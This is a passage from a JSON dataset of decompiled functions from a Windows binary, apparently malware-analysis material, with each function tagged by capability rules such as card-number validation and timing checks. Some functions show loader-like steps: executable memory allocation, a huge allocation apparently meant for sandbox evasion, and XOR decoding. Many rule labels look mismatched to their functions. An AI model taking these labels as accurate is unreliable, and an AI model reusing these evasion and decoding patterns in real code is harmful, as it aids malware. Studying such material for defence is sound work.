        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar * __cdecl fcn.004266d0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    uVar4 = *(arg_8h + 0x6af84);\n    var_8h = *(arg_8h + 0x6af94);\n    pcVar8 = *(arg_8h + 0x6af80);\n    pcVar5 = uVar4 + 0x1af70 + arg_8h;\n    if (uVar4 < 0x7efb) {\n        var_10h = 0;\n    }\n    else {\n        var_10h = uVar4 - 0x7efa;\n    }\n    cVar3 = pcVar5[pcVar8 + -1];\n    pcVar2 = uVar4 + 0x1b072 + arg_8h;\n    var_1h._0_1_ = pcVar5[pcVar8];\n    if (*(arg_8h + 0x6af9c) <= pcVar8) {\n        var_8h = var_8h >> 2;\n    }\n    do {\n        pcVar7 = arg_8h + 0x1af70 + arg_ch;\n        if ((((pcVar7[pcVar8] == var_1h) && (pcVar7[pcVar8 + -1] == cVar3)) && (*pcVar7 == *pcVar5)) &&\n           (pcVar7[1] == pcVar5[1])) {\n            pcVar5 = pcVar5 + 2;\n            pcVar7 = pcVar7 + 2;\n            while (((((pcVar6 = pcVar5 + 1,  pcVar5[1] == pcVar7[1] && (pcVar6 = pcVar5 + 2,  pcVar5[2] == pcVar7[2]))\n                     && ((pcVar6 = pcVar5 + 3,  pcVar5[3] == pcVar7[3] &&\n                         ((pcVar6 = pcVar5 + 4,  pcVar5[4] == pcVar7[4] &&\n                          (pcVar6 = pcVar5 + 5,  pcVar5[5] == pcVar7[5])))))) &&\n                    (pcVar6 = pcVar5 + 6,  pcVar5[6] == pcVar7[6])) && (pcVar6 = pcVar5 + 7,  pcVar5[7] == pcVar7[7])))\n            {\n                pcVar1 = pcVar5 + 8;\n                pcVar5 = pcVar5 + 8;\n                pcVar7 = pcVar7 + 8;\n                pcVar6 = pcVar5;\n                if ((*pcVar1 != *pcVar7) || (pcVar2 <= pcVar5)) break;\n            }\n            pcVar7 = pcVar6 + (0x102 - pcVar2);\n            pcVar5 = pcVar2 + -0x102;\n            if (pcVar8 < pcVar7) {\n                *(arg_8h + 0x6af88) = arg_ch;\n                if (*(arg_8h + 0x6afa0) <= pcVar7) {\n                    return pcVar7;\n                }\n                cVar3 = pcVar5[pcVar6 + (0x101 - pcVar2)];\n                var_1h._0_1_ = pcVar5[pcVar7];\n                pcVar8 = pcVar7;\n            }\n        }\n        arg_ch = *(arg_8h + 0x2af70 + (arg_ch & 0x7fff) * 4);\n        if (arg_ch <= var_10h) {\n            return pcVar8;\n        }\n        var_8h = var_8h - 1;\n        if (var_8h == 0) {\n            return pcVar8;\n        }\n    } while( true );\n}\n",
        "token_count": 973
    },
    "00408c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nvoid __cdecl fcn.00408c60(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *arg_ch;\n    iVar2 = arg_ch[1];\n    uVar3 = *(arg_8h + 0x34);\n    if (**(arg_8h + 4) < 10) {\n        switch(*(**(arg_8h + 4) * 4 + 0x4086a4)) {\n        case 0x2267fe8:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8c48300:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf8950ff:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x10488b06:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8b0008c2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8d52ffff:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x9b8dffff:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xfdf4b58d:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xfef8958d:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xfffdf485:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    *(arg_8h + 0x20) = *(arg_8h + 0x20);\n    *(arg_8h + 0x1c) = *(arg_8h + 0x1c);\n    arg_ch[1] = iVar2;\n    arg_ch[2] = arg_ch[2] + (iVar1 - *arg_ch);\n    *arg_ch = iVar1;\n    *(arg_8h + 0x34) = uVar3;\n    fcn.00406520(arg_8h, arg_ch, 0xfffffffe);\n    return;\n}\n",
        "token_count": 578
    },
    "004092d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nvoid __cdecl fcn.004092d0(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = arg_ch[1];\n    iVar2 = *arg_ch;\n    uVar3 = arg_8h[0xd];\n    if (9 < *arg_8h) {\n        arg_8h[8] = arg_8h[8];\n        arg_8h[7] = arg_8h[7];\n        arg_ch[1] = iVar1;\n        iVar1 = *arg_ch;\n        *arg_ch = iVar2;\n        arg_ch[2] = arg_ch[2] + (iVar2 - iVar1);\n        arg_8h[0xd] = uVar3;\n        fcn.00406520(arg_8h, arg_ch, 0xfffffffe);\n        return;\n    }\n    switch(*(*arg_8h * 4 + 0x409068)) {\n    case 0xaeb48c2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2b0573d0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3bd18b12:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x468b05eb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x468b284e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x48c22b05:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x563bf445:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x74c13b30:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x89c22b2c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8b1f752c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n}\n",
        "token_count": 561
    },
    "00401c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401c60(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = (**0x440028)(0, 2000, 0x3000, 0x40, 0);\n    iVar2 = (**0x440048)(uVar1);\n    if (iVar2 == 0) {\n        (**0x440050)(0);\n    }\n    iVar2 = (**0x440010)(0, 399000000, 0x3000, 4);\n    if (iVar2 != 0) {\n        fcn.0042acb0(iVar2, 0, 99000000);\n        iVar2 = (**0x44000c)(iVar2, 399000000, 0x8000);\n    }\n    return iVar2;\n}\n",
        "token_count": 183
    },
    "00401d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00401d60(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint unaff_ESI;\n    uint32_t uVar3;\n    uint var_1398h;\n    uint var_1394h;\n    uint var_1390h;\n    uint var_138ch;\n    uint uStackY64;\n    uint var_4h;\n    \n    fcn.0042ae40();\n    fcn.0042acb0();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.00420e80(&fcn.00401d60::var_138ch);\n    uStackY64 = 0x401de4;\n    fcn.00420e80(&fcn.00401d60::var_138ch);\n    iVar1 = (**0x440018)();\n    fcn.00420e80(&fcn.00401d60::var_138ch);\n    fcn.00420e80(&fcn.00401d60::var_138ch);\n    fcn.00420e80(&fcn.00401d60::var_138ch);\n    *(arg_10h + iVar1) = 0;\n    fcn.00420e80(&fcn.00401d60::var_138ch);\n    fcn.00420e80(&fcn.00401d60::var_138ch);\n    uVar3 = 0;\n    if (arg_10h != 0) {\n        do {\n            fcn.00420e80(&fcn.00401d60::var_138ch);\n            fcn.00420e80(&fcn.00401d60::var_138ch);\n            uVar2 = fcn.00420e80(arg_ch);\n            *(iVar1 + uVar3) = *(uVar3 % uVar2 + arg_ch) ^ (iVar1 + uVar3)[arg_8h - iVar1];\n            fcn.00420e80(&fcn.00401d60::var_138ch);\n            fcn.00420e80(&fcn.00401d60::var_138ch);\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < arg_10h);\n    }\n    fcn.00420e80(&fcn.00401d60::var_138ch);\n    fcn.00420e80(&fcn.00401d60::var_138ch);\n    fcn.00420e80(&fcn.00401d60::var_138ch);\n    fcn.0042acb0();\n    fcn.0042ad2a(unaff_ESI);\n    return;\n}\n",
        "token_count": 633
    },
    "004053a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004053a0(code *arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    int32_t unaff_EDI;\n    \n    if ((arg_10h & 2) == 0) {\n        iVar1 = (*arg_8h)(*(unaff_EDI + 0x144), 0, *(unaff_EDI + 0x140) + *(unaff_EDI + 0x13c), arg_ch);\n        if (iVar1 == 0) {\n            return 1;\n        }\n    }\n    uVar3 = 0;\n    if (*(unaff_EDI + 0x46) != 0) {\n        puVar4 = *(unaff_EDI + 0x138) + 0x10;\n        do {\n            uVar2 = puVar4[-2];\n            if (*puVar4 <= puVar4[-2]) {\n                uVar2 = *puVar4;\n            }\n            if (uVar2 != 0) {\n                iVar1 = (*arg_8h)(puVar4[-1] + *(unaff_EDI + 0x144), puVar4[1], uVar2, arg_ch);\n                if (iVar1 == 0) {\n                    return 1;\n                }\n            }\n            uVar3 = uVar3 + 1;\n            puVar4 = puVar4 + 10;\n        } while (uVar3 < *(unaff_EDI + 0x46));\n    }\n    return 0;\n}\n",
        "token_count": 369
    },
    "004058e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004058e0(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    if (arg_10h != 0) {\n        if (arg_14h[1] <= arg_ch + arg_10h && arg_ch + arg_10h != arg_14h[1]) {\n            return 0;\n        }\n        fcn.0042af40(arg_8h, *arg_14h + arg_ch, arg_10h);\n    }\n    return 1;\n}\n",
        "token_count": 130
    },
    "00405920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405920(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h;\n    var_4h = arg_ch;\n    fcn.00405750(0x404ce0, &var_8h, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 102
    },
    "00405950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405950(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (arg_8h == 0) {\n        return arg_8h;\n    }\n    if (arg_10h < 0x10000) {\n        uVar2 = *(arg_8h + 0x10 + arg_ch);\n        if (arg_10h < uVar2) {\n            return 0;\n        }\n        arg_10h = arg_10h - uVar2;\n    }\n    else {\n        uVar2 = 0;\n        if (*(arg_8h + 0x18 + arg_ch) != 0) {\n            do {\n                iVar1 = (**0x469288)(*(*(arg_8h + 0x20 + arg_ch) + uVar2 * 4 + arg_ch) + arg_ch, arg_10h);\n                if (iVar1 == 0) {\n                    arg_10h = *(*(arg_8h + 0x24 + arg_ch) + uVar2 * 2 + arg_ch);\n                    break;\n                }\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < *(arg_8h + 0x18 + arg_ch));\n        }\n    }\n    if (*(arg_8h + 0x14 + arg_ch) <= arg_10h) {\n        return 0;\n    }\n    return *(*(arg_8h + 0x1c + arg_ch) + arg_10h * 4 + arg_ch) + arg_ch;\n}\n",
        "token_count": 372
    },
    "004059f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004059f0(int32_t arg_8h, uint arg_ch)\n\n{\n    fcn.00405950(*(arg_8h + 0x14), *(arg_8h + 8), arg_ch);\n    return;\n}\n",
        "token_count": 58
    },
    "00405a90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405a90(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t **in_ECX;\n    int32_t *extraout_ECX;\n    int32_t **ppiVar4;\n    \n    piVar2 = in_ECX[4];\n    if (piVar2 < arg_8h) {\n        piVar2 = fcn.0042a19b(\"WJRI7WX91UD9AM\");\n        arg_8h = extraout_ECX;\n    }\n    uVar3 = piVar2 - arg_8h;\n    if (uVar3 < arg_ch) {\n        arg_ch = uVar3;\n    }\n    if (arg_ch != 0) {\n        ppiVar4 = in_ECX;\n        ppiVar1 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar4 = *in_ECX;\n            ppiVar1 = *in_ECX;\n        }\n        fcn.0042b4b0(ppiVar4 + arg_8h, ppiVar1 + arg_8h + arg_ch, uVar3 - arg_ch);\n        piVar2 = in_ECX[4] - arg_ch;\n        in_ECX[4] = piVar2;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar2) = 0;\n            return;\n        }\n        *(in_ECX + piVar2) = 0;\n    }\n    return;\n}\n",
        "token_count": 363
    },
    "00405ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405ce0(uint *param_1)\n\n{\n    if (0xf < param_1[5]) {\n        fcn.0042ac49(*param_1);\n    }\n    param_1[5] = 0xf;\n    param_1[4] = 0;\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 82
    },
    "00405dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405dc0(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t **ppiVar3;\n    int32_t **in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t uVar4;\n    uint *puVar5;\n    ulong uVar6;\n    \n    uVar2 = arg_8h[4];\n    uVar4 = arg_ch;\n    puVar5 = arg_8h;\n    if (uVar2 < arg_ch) {\n        uVar6 = fcn.0042a19b(\"WJRI7WX91UD9AM\");\n        puVar5 = uVar6 >> 0x20;\n        uVar2 = uVar6;\n        uVar4 = extraout_ECX;\n    }\n    if (uVar2 - uVar4 < arg_10h) {\n        arg_10h = uVar2 - uVar4;\n    }\n    uVar6 = CONCAT44(puVar5, in_ECX[4]);\n    if (-in_ECX[4] - 1U <= arg_10h) {\n        uVar6 = fcn.0042a14e(0x4453fc);\n    }\n    if (arg_10h != 0) {\n        piVar1 = uVar6 + arg_10h;\n        if (piVar1 == 0xffffffff) {\n            uVar6 = fcn.0042a14e(0x4453fc);\n        }\n        puVar5 = uVar6 >> 0x20;\n        if (in_ECX[5] < piVar1) {\n            fcn.00405b70(piVar1, uVar6);\n            puVar5 = arg_8h;\n            if (piVar1 == NULL) {\n                return;\n            }\n        }\n        else if (piVar1 == NULL) {\n            in_ECX[4] = NULL;\n            if (0xf < in_ECX[5]) {\n                **in_ECX = 0;\n                return;\n            }\n            *in_ECX = 0;\n            return;\n        }\n        if (0xf < puVar5[5]) {\n            puVar5 = *puVar5;\n        }\n        ppiVar3 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar3 = *in_ECX;\n        }\n        fcn.0042af40(in_ECX[4] + ppiVar3, puVar5 + arg_ch, arg_10h);\n        in_ECX[4] = piVar1;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar1) = 0;\n            return;\n        }\n        *(in_ECX + piVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 643
    },
    "00405eb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405eb0(int32_t *arg_8h, int32_t **arg_ch, int32_t *arg_10h, uint32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t **ppiVar4;\n    int32_t **ppiVar5;\n    int32_t **in_ECX;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *piVar6;\n    \n    piVar6 = in_ECX[4];\n    if ((piVar6 < arg_8h) || (arg_ch[4] < arg_10h)) {\n        fcn.0042a19b(\"WJRI7WX91UD9AM\");\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    uVar3 = arg_ch[4] - arg_10h;\n    if (uVar3 < arg_14h) {\n        arg_14h = uVar3;\n    }\n    if (-piVar6 - 1U <= arg_14h) {\n        fcn.0042a14e(0x4453fc);\n        piVar6 = extraout_ECX;\n    }\n    if (arg_14h != 0) {\n        piVar1 = piVar6 + arg_14h;\n        if (piVar1 == 0xffffffff) {\n            fcn.0042a14e(0x4453fc);\n            piVar6 = extraout_ECX_00;\n        }\n        if (in_ECX[5] < piVar1) {\n            fcn.00405b70(piVar1, piVar6);\n            if (piVar1 == NULL) {\n                return;\n            }\n        }\n        else if (piVar1 == NULL) {\n            in_ECX[4] = NULL;\n            if (in_ECX[5] < 0x10) {\n                *in_ECX = 0;\n                return;\n            }\n            **in_ECX = 0;\n            return;\n        }\n        ppiVar4 = in_ECX;\n        ppiVar5 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar4 = *in_ECX;\n            ppiVar5 = *in_ECX;\n        }\n        fcn.0042b4b0(ppiVar4 + arg_8h + arg_14h, ppiVar5 + arg_8h, in_ECX[4] - arg_8h);\n        if (in_ECX == arg_ch) {\n            piVar6 = arg_10h + arg_14h;\n            if (arg_10h <= arg_8h) {\n                piVar6 = arg_10h;\n            }\n            if (in_ECX[5] < 0x10) {\n                fcn.0042b4b0(in_ECX + arg_8h, in_ECX + piVar6, arg_14h);\n            }\n            else {\n                fcn.0042b4b0(*in_ECX + arg_8h, *in_ECX + piVar6, arg_14h);\n            }\n        }\n        else {\n            if (0xf < arg_ch[5]) {\n                arg_ch = *arg_ch;\n            }\n            ppiVar5 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                ppiVar5 = *in_ECX;\n            }\n            fcn.0042af40(ppiVar5 + arg_8h, arg_ch + arg_10h, arg_14h);\n        }\n        in_ECX[4] = piVar1;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar1) = 0;\n            return;\n        }\n        *(in_ECX + piVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 876
    },
    "00406030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406030(int32_t *arg_8h, int32_t **arg_ch, uint32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    int32_t **ppiVar4;\n    int32_t **in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    \n    if (arg_ch != NULL) {\n        piVar2 = in_ECX[5];\n        ppiVar4 = in_ECX;\n        if (0xf < piVar2) {\n            ppiVar4 = *in_ECX;\n        }\n        if (ppiVar4 <= arg_ch) {\n            ppiVar4 = in_ECX;\n            if (0xf < piVar2) {\n                ppiVar4 = *in_ECX;\n            }\n            if (arg_ch < in_ECX[4] + ppiVar4) {\n                ppiVar4 = in_ECX;\n                if (0xf < piVar2) {\n                    ppiVar4 = *in_ECX;\n                }\n                fcn.00405eb0(arg_8h, in_ECX, arg_ch - ppiVar4, arg_10h);\n                return;\n            }\n        }\n    }\n    piVar2 = in_ECX[4];\n    if (piVar2 < arg_8h) {\n        piVar2 = fcn.0042a19b(\"WJRI7WX91UD9AM\");\n    }\n    uVar5 = arg_10h;\n    if (-piVar2 - 1U <= arg_10h) {\n        piVar2 = fcn.0042a14e(0x4453fc);\n        uVar5 = extraout_ECX;\n    }\n    if (uVar5 != 0) {\n        piVar1 = piVar2 + uVar5;\n        if (piVar1 == 0xffffffff) {\n            piVar2 = fcn.0042a14e(0x4453fc);\n        }\n        if (in_ECX[5] < piVar1) {\n            fcn.00405b70(piVar1, piVar2);\n            if (piVar1 == NULL) {\n                return;\n            }\n        }\n        else if (piVar1 == NULL) {\n            in_ECX[4] = NULL;\n            if (in_ECX[5] < 0x10) {\n                *in_ECX = 0;\n                return;\n            }\n            **in_ECX = 0;\n            return;\n        }\n        ppiVar3 = in_ECX;\n        ppiVar4 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar3 = *in_ECX;\n            ppiVar4 = *in_ECX;\n        }\n        fcn.0042b4b0(ppiVar3 + arg_8h + arg_10h, ppiVar4 + arg_8h, in_ECX[4] - arg_8h);\n        ppiVar4 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar4 = *in_ECX;\n        }\n        fcn.0042af40(ppiVar4 + arg_8h, arg_ch, arg_10h);\n        in_ECX[4] = piVar1;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar1) = 0;\n            return;\n        }\n        *(in_ECX + piVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 797
    },
    "00406180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406180(int32_t **arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t **arg_8h_00;\n    int32_t **in_ECX;\n    int32_t **extraout_ECX;\n    int32_t **extraout_ECX_00;\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    \n    piVar2 = arg_8h[4];\n    ppiVar1 = arg_8h;\n    if (piVar2 < arg_ch) {\n        fcn.0042a19b(\"WJRI7WX91UD9AM\");\n        ppiVar1 = extraout_ECX;\n    }\n    piVar2 = piVar2 - arg_ch;\n    if (arg_10h < piVar2) {\n        piVar2 = arg_10h;\n    }\n    if (in_ECX == ppiVar1) {\n        fcn.00405a90(piVar2 + arg_ch, 0xffffffff);\n        fcn.00405a90(0, arg_ch);\n        return;\n    }\n    if (piVar2 == 0xffffffff) {\n        fcn.0042a14e(0x4453fc);\n        ppiVar1 = extraout_ECX_00;\n    }\n    if (in_ECX[5] < piVar2) {\n        fcn.00405b70(piVar2, in_ECX[4]);\n        ppiVar1 = arg_8h;\n        if (piVar2 == NULL) {\n            return;\n        }\n    }\n    else if (piVar2 == NULL) {\n        in_ECX[4] = NULL;\n        if (0xf < in_ECX[5]) {\n            **in_ECX = 0;\n            return;\n        }\n        *in_ECX = 0;\n        return;\n    }\n    if (0xf < ppiVar1[5]) {\n        ppiVar1 = *ppiVar1;\n    }\n    arg_8h_00 = in_ECX;\n    if (0xf < in_ECX[5]) {\n        arg_8h_00 = *in_ECX;\n    }\n    fcn.0042af40(arg_8h_00, ppiVar1 + arg_ch, piVar2);\n    in_ECX[4] = piVar2;\n    if (in_ECX[5] < 0x10) {\n        *(in_ECX + piVar2) = 0;\n        return;\n    }\n    *(*in_ECX + piVar2) = 0;\n    return;\n}\n",
        "token_count": 578
    },
    "00406270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406270(int32_t **arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **in_ECX;\n    \n    if (arg_8h != NULL) {\n        piVar1 = in_ECX[5];\n        ppiVar2 = in_ECX;\n        if (0xf < piVar1) {\n            ppiVar2 = *in_ECX;\n        }\n        if (ppiVar2 <= arg_8h) {\n            ppiVar2 = in_ECX;\n            if (0xf < piVar1) {\n                ppiVar2 = *in_ECX;\n            }\n            if (arg_8h < in_ECX[4] + ppiVar2) {\n                if (0xf < piVar1) {\n                    fcn.00406180(in_ECX, arg_8h - *in_ECX, arg_ch);\n                    return;\n                }\n                fcn.00406180(in_ECX, arg_8h - in_ECX, arg_ch);\n                return;\n            }\n        }\n    }\n    if (arg_ch == 0xffffffff) {\n        fcn.0042a14e(0x4453fc);\n    }\n    if (in_ECX[5] < arg_ch) {\n        fcn.00405b70(arg_ch, in_ECX[4]);\n        if (arg_ch == NULL) {\n            return;\n        }\n    }\n    else if (arg_ch == NULL) {\n        in_ECX[4] = NULL;\n        if (0xf < in_ECX[5]) {\n            **in_ECX = 0;\n            return;\n        }\n        *in_ECX = 0;\n        return;\n    }\n    ppiVar2 = in_ECX;\n    if (0xf < in_ECX[5]) {\n        ppiVar2 = *in_ECX;\n    }\n    fcn.0042af40(ppiVar2, arg_8h, arg_ch);\n    in_ECX[4] = arg_ch;\n    if (in_ECX[5] < 0x10) {\n        *(in_ECX + arg_ch) = 0;\n        return;\n    }\n    *(*in_ECX + arg_ch) = 0;\n    return;\n}\n",
        "token_count": 506
    },
    "00406370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406370(uint arg_8h)\n\n{\n    uint arg_ch;\n    uchar *in_ECX;\n    \n    *(in_ECX + 0x14) = 0xf;\n    *(in_ECX + 0x10) = 0;\n    *in_ECX = 0;\n    arg_ch = fcn.0042b420(arg_8h);\n    fcn.00406270(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "004063b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004063b0(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    \n    if (in_ECX != arg_8h) {\n        if (0xf < in_ECX[5]) {\n            fcn.0042ac49(*in_ECX);\n        }\n        in_ECX[5] = 0xf;\n        in_ECX[4] = 0;\n        *in_ECX = 0;\n        if (arg_8h[5] < 0x10) {\n            fcn.0042b4b0(in_ECX, arg_8h, arg_8h[4] + 1);\n        }\n        else {\n            *in_ECX = *arg_8h;\n            *arg_8h = 0;\n        }\n        in_ECX[4] = arg_8h[4];\n        in_ECX[5] = arg_8h[5];\n        arg_8h[4] = 0;\n        arg_8h[5] = 0;\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "00406460": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00406460(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0042b420(arg_ch);\n    uVar1 = fcn.00406030(0, arg_ch, uVar1);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    fcn.004063b0(uVar1);\n    return arg_8h;\n}\n",
        "token_count": 143
    },
    "00406520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
